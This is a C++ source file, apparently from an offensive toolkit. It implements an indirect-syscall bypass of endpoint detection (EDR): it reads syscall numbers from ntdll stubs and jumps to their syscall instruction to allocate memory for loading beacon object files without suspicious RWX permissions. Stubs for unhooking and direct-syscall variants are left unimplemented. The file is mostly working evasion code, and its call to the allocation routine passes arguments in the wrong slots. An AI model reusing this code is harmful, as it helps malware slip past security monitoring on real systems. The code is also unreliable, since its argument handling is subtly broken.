#include <windows.h>

#define EDR_BYPASS_INDIRECT_SYSCALL
/**
 * TASK:
 *
 * 1. We want to use indirect syscalls to create
 *      functions of VirtualAlloc() and other important functions.
 *
 * 2. Use those functions to load BOFs.
 *
 * 3. But paying attention to creating memory with only R/W permissions
 *
 * 4. After loading the code, we can make it execute.
 *      Because RWX is suspicious
 */

 // Syscall numbers TOD: somehow obfuscate this.
#define SYS_NT_ALLOCATE_VIRTUAL_MEMORY      0x34  // VirtualAlloc()
typedef unsigned __int64 QWORD;

#ifdef EDR_BYPASS_INDIRECT_SYSCALL
// ======================================================================
// ==================== Indirect Syscall Start ==========================
// ======================================================================

HMODULE ntdllHandle = NULL;

// The function and variables defined in the syscalls.asm
extern "C" {
    QWORD syscallJumpAddr = NULL; // Address of the syscall bytes.

    // All variables to store the syscall numbers in.
    DWORD virtualAllocCallNumber;           // VirtualAlloc()


    // The function that calls VirtualAlloc().
    NTSTATUS DirectVirtualAlloc(
        IN HANDLE ProcessHandle,
        IN OUT LPVOID BaseAddress,
        IN ULONG ZeroBits,
        IN SIZE_T* RegionSize,
        IN DWORD AllocationType,
        IN DWORD Protect
    );
}

// Loads the NTDLL library in and the function to use.
void LoadNTDLL(LPCSTR funcName, DWORD* syscallNumber) {

    // Check if ntdll has been loaded already.
    if (ntdllHandle == NULL) {
        ntdllHandle = GetModuleHandleA("NTDLL"); // Grab NTDLL.dll 
    }

    // Load specific function.
    UINT_PTR NtFunctionAddr = (UINT_PTR)GetProcAddress(ntdllHandle, funcName); // Then grab the function we want.

    /*
    *   This is how it works:

    *   1. We get the location of the NtFunctionWeWant
    *   2. We get the 5th byte (XX), which is the syscall number of the NtFunctionWeWant
    *   3. Then we want to jump to the syscall => 0000000000000XAD2

        0000000000000XAC0 4C 8B D1                  mov         r10,rcx
        0000000000000XAC3 B8 XX 00 00 00            mov         eax,XX                              ; The syscall number
        0000000000000XAC8 F6 04 25 08 03 FE 7F 01   test        byte ptr [7FFE0308h],1
        0000000000000XAD0 75 03                     jne         NtFunctionWeWant+15h (0x000XXXXX)
        0000000000000XAD2 0F 05                     syscall                                         ; This location we jump to.
        0000000000000XAD4 C3                        ret

    */

    // Get the 5th byte which represents the syscall number
    *syscallNumber = ((PBYTE)(NtFunctionAddr + 4))[0];

    // Check if we already defined the jump address.
    if (syscallJumpAddr == NULL) {
        syscallJumpAddr = NtFunctionAddr + 0x12; // Set the jump addr to the first syscall jump.
    }
}

// The API function.
LPVOID InDirectVirtualAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect) {

    LoadNTDLL("NtAllocateVirtualMemory", &virtualAllocCallNumber); // The syscall address to jump to.

    //printf("Syscall location: %p\n", jumpAddr);

    HANDLE p = GetCurrentProcess();
    return (void*)DirectVirtualAlloc(p, lpAddress, dwSize, NULL, flAllocationType, flProtect);

    //return VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
}


// ======================================================================
// ==================== Indirect Syscall End ============================
// ======================================================================
#elif defined EDR_BYPASS_HOOK_JUMP
// TODO: implement
#elif defined EDR_BYPASS_DIRECT_SYSCALL
// TODO: implement
#elif defined EDR_BYPASS_UNHOOK_EDR
// TODO: implement
#endif 